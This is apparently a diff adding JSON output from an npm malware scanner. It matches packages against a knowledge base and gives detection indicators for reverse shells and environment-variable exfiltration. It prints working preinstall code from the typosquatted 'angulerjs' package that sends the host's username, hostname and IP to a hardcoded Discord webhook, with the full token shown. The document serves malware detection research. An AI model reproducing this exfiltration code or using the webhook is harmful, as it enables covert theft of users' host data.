+                    "Spawning a shell process (e.g., /bin/sh or cmd.exe) and connecting to a hardcoded external IP/port at import-time or runtime",
+                    "Piping shell input/output streams to a network socket for remote command execution",
+                    "Accessing and serializing all environment variables from process.env",
+                    "Base64 encoding of environment data followed by HTTP POST to a hardcoded external server at import-time or runtime"
+                  ],
+                  "file_indicators": [
+                    "Presence of code that spawns /bin/sh or cmd.exe using child_process.spawn",
+                    "Hardcoded IP addresses (e.g., 50.x.x.x) or hostnames (e.g., x.x.x.net) in source code",
+                    "Base64 encoding of environment variables in code",
+                    "HTTP POST requests to /log/ endpoint in code"
+                  ],
+                  "network_indicators": [
+                    "Outbound TCP connections to uncommon ports (e.g., 1111) or suspicious hardcoded IP addresses",
+                    "HTTP POST requests to suspicious domains (e.g., x.x.x.net) or IPs with base64-encoded payloads in the body"
+                  ],
+                  "how_to_detect": "Monitor for npm packages that spawn shell processes or open outbound network connections to hardcoded IP addresses or domains at install, import, or runtime. Flag packages that access process.env and transmit its contents externally, especially if the data is encoded or sent to hardcoded domains or endpoints such as /log/. Use static analysis to detect reverse shell patterns and dynamic analysis to observe unexpected network activity or environment variable exfiltration upon package installation or import."
+                }
+              }
+            },
+            {
+              "match_id": "20241223_205438_695471_snippet_1",
+              "source_package": "angulerjs (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20241223_205438_695471/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.45198503136634827,
+              "code_similarity": 0.3923459053039551,
+              "behavior_similarity": 0.5116241574287415,
+              "matched_snippet": {
+                "snippet_id": "snippet_1",
+                "code_snippet": "// new.js (formatted)\nconst os = require('os');\nconst https = require('https');\nconst { execSync } = require('child_process');\nconst username = os.userInfo().username;\nconst hostname = os.hostname();\nlet ip = '';\ntry {\n  ip = execSync('curl -s ifconfig.me').toString().trim();\n} catch (e) {}\nconst data = JSON.stringify({ username, hostname, ip });\nconst options = {\n  hostname: 'discord.com',\n  path: '/api/webhooks/1155988140591419412/bleuGvUtBCzaGsAkAI1MT9Yd-6YxHuUlZe91XSdfioky5-0e3gzeW4ztWskX1qYjSxzr',\n  method: 'POST',\n  headers: { 'Content-Type': 'application/json' }\n};\nconst req = https.request(options);\nreq.write(data);\nreq.end();",
+                "code_behavior": "At preinstall, the code collects the current user's username, hostname, and public IP address using os and child_process modules, then sends this data via HTTPS POST to a hardcoded Discord webhook endpoint, resulting in exfiltration of host information to an attacker-controlled server.",
+                "malice_analysis": {
+                  "why_suspicious": "The script is executed automatically during the npm package installation process, collects sensitive system and network information, and transmits it to an external Discord webhook without any user notification or consent. This behavior is a clear indicator of malicious intent, as it enables unauthorized data exfiltration at install-time.",
+                  "violated_expectations": "Legitimate npm packages do not collect or transmit host information during installation. Preinstall scripts are expected to perform setup or dependency checks, not to access user details or make outbound network requests to third-party endpoints.",
+                  "similar_legitimate_use": "Some legitimate tools may collect anonymized telemetry or error data, but only with explicit user consent and clear documentation. They do not exfiltrate sensitive host information silently during installation.",
+                  "key_indicators": [
+                    "Use of preinstall script to trigger code execution during installation",
+                    "Collection of username, hostname, and public IP address via os and child_process modules",
+                    "Outbound HTTPS POST request to a hardcoded Discord webhook endpoint",
+                    "No user notification, consent, or documentation of data collection",
+                    "Presence of new.js referenced in package.json preinstall field"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "preinstall",
+                  "file_location": "package.json (preinstall field) and new.js",
+                  "required_permissions": [
+                    "network",
+                    "filesystem",
+                    "environment_vars"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "angulerjs",
+                  "package_manager": "npm",
+                  "package_versions": "1.1.3 (and all versions prior to 8.7.6)",
+                  "why_malicious": "The package is malicious because it surreptitiously collects sensitive host information (username, hostname, and public IP address) during installation and exfiltrates it to attacker-controlled endpoints without user knowledge or consent. It was distributed as part of a large-scale typosquatting campaign, mimicking popular libraries to deceive users and facilitate unauthorized data collection."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "User installs the malicious npm package (e.g., angulerjs@1.1.3).",
+                    "implemented_by": [],
+                    "leads_to": "Triggers preinstall script execution."
+                  },
+                  {
+                    "step": 2,
+                    "action": "The preinstall script (new.js) is executed, collecting username, hostname, and public IP address from the host system.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Data is prepared for exfiltration."
+                  },
+                  {
+                    "step": 3,
+                    "action": "Collected data is sent via HTTPS POST to a Discord webhook controlled by the attacker.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Attacker receives sensitive host information."
+                  },
+                  {
+                    "step": 4,
+                    "action": "If index.js is executed (manually or by other means), it collects the same information and sends it to hits.dwyl.com.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "Provides an alternate exfiltration channel for the attacker."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "npm preinstall scripts that collect and exfiltrate system information (username, hostname, public IP) during installation",
+                    "Outbound network requests to Discord webhooks or suspicious domains (e.g., hits.dwyl.com) from installation scripts",
+                    "Presence of redundant exfiltration logic in both preinstall scripts and main entry points (e.g., new.js and index.js)"
+                  ],
+                  "file_indicators": [
+                    "package.json with preinstall field referencing suspicious scripts such as new.js",
+                    "new.js or index.js files containing combined use of os, https, and child_process modules for data collection and transmission",
+                    "Hardcoded references to external domains such as discord.com/api/webhooks or hits.dwyl.com in JavaScript files"
+                  ],
+                  "network_indicators": [
+                    "Outbound HTTPS POST requests to discord.com/api/webhooks/1155988140591419412/bleuGvUtBCzaGsAkAI1MT9Yd-6YxHuUlZe91XSdfioky5-0e3gzeW4ztWskX1qYjSxzr",
+                    "Outbound HTTPS POST requests to hits.dwyl.com/api/collect"
+                  ],
+                  "how_to_detect": "Monitor npm package installations for preinstall scripts that access system information (username, hostname, public IP) and initiate outbound network requests to external domains, especially Discord webhooks or non-standard endpoints like hits.dwyl.com. Flag packages with suspiciously named scripts (e.g., new.js) referenced in package.json preinstall fields. Use static analysis to detect the use of os, https, and child_process modules in installation or entry-point scripts, and employ network monitoring to identify exfiltration attempts to known malicious endpoints. Pay special attention to packages with names mimicking popular libraries, as these are common in typosquatting campaigns."
+                }
+              }
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "file_path": "/home/wenbo/NPMAnalysis/Dataset/unzip_benign/driverstation/0.6.1/package/lib/utils.js",
+      "status": "empty",
+      "is_malicious": false,
+      "total_slices": 0,
+      "malicious_slices": 0,
+      "slice_results": []
+    }
+  ]
+}
